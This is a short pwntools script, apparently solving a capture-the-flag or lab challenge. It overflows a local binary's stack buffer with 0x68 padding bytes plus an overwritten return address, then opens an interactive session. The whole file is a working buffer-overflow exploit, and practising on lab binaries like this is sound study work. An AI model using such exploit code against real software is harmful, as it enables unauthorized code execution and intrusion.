import pwnlib.tubes.process as process
from pwn import gdb

p = process.process("/home/kali/Downloads/unkown_entity")
p.recvline()
p.sendline(b'please')
p.recvline()
st = b'A'*0x68 + b'\x35\x18\x40'
p.sendline(st)
p.interactive()